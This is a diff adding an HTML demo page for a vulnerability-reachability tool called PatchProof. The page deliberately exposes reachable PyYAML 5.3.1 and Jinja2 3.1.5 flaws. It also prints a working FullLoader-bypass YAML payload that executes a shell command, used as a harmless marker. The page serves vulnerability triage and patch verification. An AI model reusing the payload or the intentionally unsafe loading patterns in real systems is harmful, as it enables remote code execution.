@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>DocuFlow — PatchProof Demo</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <header>
+    <h1>DocuFlow <small>v0.1.0 — PatchProof demo (frontend + backend)</small></h1>
+    <nav><a href="/health">health</a> · <a href="/api/documents">documents JSON</a> · <a href="/api/config/defaults">defaults</a></nav>
+  </header>
+
+  <main>
+    <section class="card" id="yaml-card">
+      <h2>YAML Config Import <span class="badge vuln">pyyaml 5.3.1 — CVE-2020-14343 — REACHABLE</span></h2>
+      <p>Paste YAML. The backend does <code>yaml.load(body, FullLoader)</code> on your bytes. On <code>5.3.1</code> this is RCE.</p>
+      <textarea id="yamlInput" rows="5">title: hello
+body: world</textarea>
+      <button onclick="importYaml()">Import via POST /api/config/import</button>
+      <pre id="yamlOut"></pre>
+      <details><summary>PoC payload (FullLoader bypass)</summary><pre>!!python/object/new:type
+  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+  listitems: "__import__('os').system('touch /tmp/patchproof_pwned')"</pre></details>
+    </section>
+
+    <section class="card" id="jinja-card">
+      <h2>Template Render <span class="badge vuln">jinja2 3.1.5 — GHSA-cpwx — REACHABLE</span></h2>
+      <p>Template string from JSON body via <code>SandboxedEnvironment.from_string</code> + <code>fmt</code> filter calling <code>value.format()</code>. On <code>3.1.5</code> this escapes the sandbox.</p>
+      <input id="tmpl" value="Hello {{ name | fmt('') }}" style="width:100%">
+      <input id="ctx" value='{"name":"bob"}' style="width:100%;margin-top:6px">
+      <button onclick="render()">Render via POST /api/render</button>
+      <pre id="renderOut"></pre>
+    </section>
+
+    <section class="card">
+      <h2>Documents <small>— uses same vulnerable deps but via safe paths</small></h2>
+      <form onsubmit="createDoc(event)">
+        <input id="docTitle" placeholder="title" required>
+        <input id="docBody" placeholder="body" required>
+        <button>Create POST /api/documents</button>
+      </form>
+      <button onclick="listDocs()">Refresh list GET /api/documents</button>
+      <ul id="docList"></ul>
+      <p><em>Export</em> renders a <strong>checked-in</strong> <code>invoice.html.j2</code> template on disk (NOT_REACHABLE — PatchProof proves scanner flag here is fatigue):</p>
+      <input id="exportId" placeholder="doc id" type="number" style="width:120px">
+      <button onclick="exportDoc()">Export GET /api/documents/{id}/export</button>
+      <pre id="exportOut"></pre>
+    </section>
+
+    <section class="card muted">
+      <h2>Scanner vs PatchProof</h2>
+      <ul>
+        <li>Scanner (Trivy) flags: <code>pyyaml==5.3.1 ≤5.3.1</code> + <code>jinja2==3.1.5 &lt;3.1.6</code> + frontend <code>lodash 4.17.20 &lt;4.17.21</code> <code>axios 1.15.0 &lt;1.15.2</code> — 4 alerts.</li>
+        <li>PatchProof analyzer: confirms pins, finds 4 call sites, traces input — marks <strong>2 REACHABLE</strong> (import + render) and <strong>2 NOT_REACHABLE</strong> (defaults.yaml at startup, fixed template file) — proves 2 alerts are fatigue.</li>
+        <li>Harness: <code>sandbox_build</code> → <code>sandbox_write poc → sandbox_exec</code> → <code>verdict.json</code> <code>exploitable:true</code> (marker <code>/tmp/patchproof_pwned</code>), judge agrees, patcher bumps to <code>pyyaml 6.0.1 + jinja2 3.1.6</code>, tests pass, PoCs now <code>false</code>, verifier confirms.</li>
+      </ul>
+      <p>OSV-verified pins: see <code>requirements.lock</code> + <code>frontend/package.json</code> — all updated via <code>https://api.osv.dev/v1/query</code> to latest vulnerable before fix.</p>
+    </section>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.15.0/dist/axios.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.20/lodash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/marked@4.0.18/marked.min.js"></script>
+  <script src="/static/app.js"></script>
+</body>
+</html>
